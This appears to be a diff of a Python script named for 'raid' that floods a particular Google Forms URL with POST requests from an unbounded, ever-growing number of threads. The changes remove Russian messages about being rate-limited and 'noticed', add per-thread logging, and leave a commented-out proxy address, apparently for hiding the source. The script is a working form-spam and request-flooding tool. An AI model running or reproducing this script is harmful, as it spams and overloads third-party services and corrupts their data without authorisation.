@@ -44,8 +44,7 @@ random_num = [1, 5]
 
 jojo = random.choice(random_num)
    
-def raid(a, b, c, d):
-    i = 0                   
+def raid(a, b, c, d, e:int):
     while True:
         r = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSfSA182h4jGDBIOcfyMgxeorPUokkb26QS4KZtMpB5H6O3ZcA/formResponse",
                         data={
@@ -80,20 +79,22 @@ def raid(a, b, c, d):
         if r.status_code == 200:
             status = "OK"
         elif r.status_code == 429:
-            status ="TooManyRequests (хватит на сегодня)"
+            status ="TooManyRequests"
         elif r.status_code == 405:
-            status = "MethodNotAllowed (Вас заметили)"
+            status = "MethodNotAllowed"
         else:
             status = "Undefined"
 
-        i += 1
+        thr = threading.enumerate()[len(threading.enumerate()) - 1]
 
         # print("==============================================\n\n\n")
-        LogManager.info(f"{r} === {i} <<== ==>> {status}")
+        LogManager.info(f"{thr} === {r} === {e + 1} === {status}")
         # print("\n\n\n==============================================\n\n\n")
 
+i = 0
 while True:
-    threading.Thread(target = raid, args = (_first_answer_, _second_answer_, _third_answer_, jojo)).start()
+    threading.Thread(target = raid, args = (_first_answer_, _second_answer_, _third_answer_, jojo, i)).start()
+    i += 1
 
 # 'proxies = {
 # "https" : "https://159.8.114.34:8123"
